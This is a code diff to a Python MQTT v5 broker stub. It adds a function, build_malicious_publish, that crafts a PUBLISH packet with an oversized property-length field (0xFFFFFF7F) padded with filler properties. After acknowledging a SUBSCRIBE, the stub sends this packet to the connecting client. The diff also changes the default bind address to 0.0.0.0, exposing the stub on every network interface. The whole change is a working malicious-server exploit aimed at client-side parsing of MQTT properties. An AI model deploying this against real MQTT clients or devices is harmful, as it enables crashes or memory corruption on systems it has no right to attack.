@@ -82,6 +82,42 @@ def build_connack(session_present: int = 0, reason_code: int = 0) -> bytes:
     return bytes([0x20]) + encode_varint(len(payload)) + payload
 
 
+def build_suback(packet_id: int, reason_code: int = 0) -> bytes:
+    # MQTT v5 SUBACK: [0x90][remaining_len][packet_id][props_len=0][reason]
+    payload = packet_id.to_bytes(2, "big") + bytes([0x00, reason_code & 0xFF])
+    return bytes([0x90]) + encode_varint(len(payload)) + payload
+
+
+def build_property_stream_even(target_len: int) -> bytes:
+    # Build a stream of valid 2-byte properties (Payload Format Indicator).
+    if target_len % 2 != 0:
+        raise ValueError("target_len must be even for 2-byte properties")
+    return bytes([0x01, 0x01]) * (target_len // 2)
+
+
+def build_malicious_publish(topic: str = "sensor/data") -> bytes:
+    # QoS 0 PUBLISH
+    topic_bytes = topic.encode("utf-8")
+    topic_len = len(topic_bytes)
+    prop_len_field = bytes([0xFF, 0xFF, 0xFF, 0x7F])
+    props = b""
+    variable_header = (
+        topic_len.to_bytes(2, "big")
+        + topic_bytes
+        + prop_len_field
+        + props
+    )
+    # Choose an odd Remaining Length so payload_len is even.
+    remaining_len = 4097
+    if len(variable_header) > remaining_len:
+        raise ValueError("variable header exceeds remaining length")
+    payload_len = remaining_len - len(variable_header)
+    if payload_len % 2 != 0:
+        raise ValueError("payload_len must be even for property stream")
+    payload = build_property_stream_even(payload_len)
+    return bytes([0x30]) + encode_varint(remaining_len) + variable_header + payload
+
+
 class MQTTStubHandler(socketserver.BaseRequestHandler):
     def handle(self) -> None:
         sock: socket.socket = self.request
@@ -124,6 +160,16 @@ class MQTTStubHandler(socketserver.BaseRequestHandler):
                 connack = build_connack()
                 sock.sendall(connack)
                 logging.info("tx CONNACK to %s", peer)
+            elif packet_type == 8:  # SUBSCRIBE
+                if len(payload) < 2:
+                    raise ValueError("malformed SUBSCRIBE (no packet id)")
+                packet_id = int.from_bytes(payload[0:2], "big")
+                suback = build_suback(packet_id)
+                sock.sendall(suback)
+                logging.info("tx SUBACK to %s (packet_id=%d)", peer, packet_id)
+                malicious = build_malicious_publish()
+                sock.sendall(malicious)
+                logging.info("tx malicious PUBLISH to %s", peer)
             # For now, ignore all other packet types and keep the TCP session open.
 
 
@@ -134,7 +180,7 @@ class ThreadingTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
 
 def parse_args() -> argparse.Namespace:
     parser = argparse.ArgumentParser(description="Minimal MQTT v5 broker stub")
-    parser.add_argument("--host", default="127.0.0.1", help="bind host")
+    parser.add_argument("--host", default="0.0.0.0", help="bind host")
     parser.add_argument("--port", default=1884, type=int, help="bind port")
     parser.add_argument("--log-level", default="INFO", help="logging level")
     return parser.parse_args()
